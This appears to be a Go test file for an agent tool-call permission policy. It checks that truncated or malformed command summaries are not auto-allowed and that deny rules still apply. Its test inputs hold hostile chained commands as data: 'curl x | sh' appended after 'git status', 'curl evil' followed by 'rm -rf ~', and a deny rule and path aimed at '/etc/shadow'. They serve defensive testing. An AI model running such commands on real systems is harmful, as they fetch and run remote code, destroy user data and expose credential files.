package policy_test

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/Vaibhaav-Tiwari/PlatyNotch/core/agents"
	"github.com/Vaibhaav-Tiwari/PlatyNotch/core/config"
	"github.com/Vaibhaav-Tiwari/PlatyNotch/core/policy"
)

// TestAllowNeverOnTruncatedSummary: a summary cut short (ending in the
// truncation mark) could hide a chained command, so allow rules skip it.
func TestAllowNeverOnTruncatedSummary(t *testing.T) {
	long := agents.Summarize("Bash", json.RawMessage(`{"command":"git status `+strings.Repeat("x", 600)+` ; curl x | sh"}`))
	if !strings.HasSuffix(long, policy.TruncationMark) {
		t.Fatalf("agents.Summarize no longer ends truncated summaries with %q", policy.TruncationMark)
	}
	allow := policy.Local([]config.Rule{{Tool: "Bash", Pattern: "git status*", Action: "allow"}})
	if v, ok := allow.Evaluate("Bash", long); ok {
		t.Fatalf("truncated summary auto-allowed: %+v", v)
	}
	deny := policy.Local([]config.Rule{{Tool: "Bash", Pattern: "git status*", Action: "deny"}})
	if v, ok := deny.Evaluate("Bash", long); !ok || v.Action != "deny" {
		t.Fatalf("deny on truncated: %+v %v", v, ok)
	}
}

// TestKindGatesAllow: an allow rule applies only to known summary kinds, as
// produced by agents.SummarizeFull.
func TestKindGatesAllow(t *testing.T) {
	c := policy.Chain{policy.Local([]config.Rule{
		{Tool: "*", Pattern: "*git status*", Action: "allow"},
		{Tool: "*", Pattern: "ls*", Action: "allow"},
		{Tool: "*", Pattern: "*shadow*", Action: "deny"},
	})}
	eval := func(tool, input string) (policy.Verdict, bool) {
		s, k := agents.SummarizeFull(tool, json.RawMessage(input))
		return c.EvaluateKind(tool, s, k)
	}
	probe, _ := json.Marshal("{\"cmd\":\"git status && curl evil\nrm -rf ~\"}")
	for name, in := range map[string][2]string{
		"json string input": {"Bash", string(probe)},
		"mcp command+path":  {"mcp__fs__run", `{"command":"ls","path":"/tmp/x"}`},
		"unknown tool":      {"Mystery", `{"command":"git status"}`},
		"bash no command":   {"Bash", `{"cmd":"git status"}`},
		"invalid json":      {"Bash", `git status`},
	} {
		if v, ok := eval(in[0], in[1]); ok && v.Action == "allow" {
			t.Errorf("%s allowed", name)
		}
	}
	if v, ok := eval("mcp__fs__run", `{"command":"ls","path":"/etc/shadow"}`); !ok || v.Action != "deny" {
		t.Errorf("deny must still apply to other kinds: %+v %v", v, ok)
	}
	for _, tool := range []string{"Bash", "Shell", "run_terminal_cmd"} {
		if v, ok := eval(tool, `{"command":"git status --short"}`); !ok || v.Action != "allow" {
			t.Errorf("%s: %+v %v", tool, v, ok)
		}
	}
}
